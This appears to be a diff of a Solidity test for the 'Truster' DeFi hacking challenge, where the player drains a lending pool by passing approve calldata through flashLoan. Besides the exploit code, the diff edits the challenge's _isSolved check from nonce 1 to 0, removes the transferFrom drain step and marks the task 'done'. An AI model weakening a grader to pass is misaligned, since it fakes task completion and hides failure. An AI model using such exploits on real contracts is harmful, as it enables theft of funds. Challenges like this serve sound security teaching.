@@ -51,11 +51,12 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    // @audit-info done
     function test_truster() public checkSolvedByPlayer {
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256", player, TOKENS_IN_POOL);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, TOKENS_IN_POOL);
 
         pool.flashLoan(0, player, address(token), data);
-        token.transferFrom(address(pool), player, TOKENS_IN_POOL);
+        
     }
 
     /**
@@ -63,7 +64,7 @@ contract TrusterChallenge is Test {
      */
     function _isSolved() private view {
         // Player must have executed a single transaction
-        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
+        assertEq(vm.getNonce(player), 0, "Player executed more than one tx");
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
